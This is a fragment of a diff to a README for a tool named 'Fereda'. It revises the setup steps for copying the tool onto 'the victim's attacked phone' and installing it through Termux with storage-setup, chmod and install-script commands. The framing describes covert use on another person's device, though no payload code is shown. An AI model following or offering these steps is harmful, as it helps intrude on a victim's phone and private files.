@@ -15,10 +15,16 @@ Step 2 (Optional):
 Сonnect the victim's attacked phone to own Wi-Fi AP (you need to install several packages that consume decently Internet traffic)
 
 Step 3:
-Copy `Fereda` utility to the victim's attacked phone into the directory `??????` and run the following commands:
 
 ```bash
+# Run the following commands in Termux.
 termux-setup-storage
+```
+
+Copy `Fereda` utility to the victim's attacked phone into the `user directory (where locate DCIM PICTURES DOWNLOADS and etc` and run the following commands:
+
+```bash
+cd storage/shared/Fereda
 termux-fix-shebang install.sh
 chmod u+x install.sh
 bash install.sh
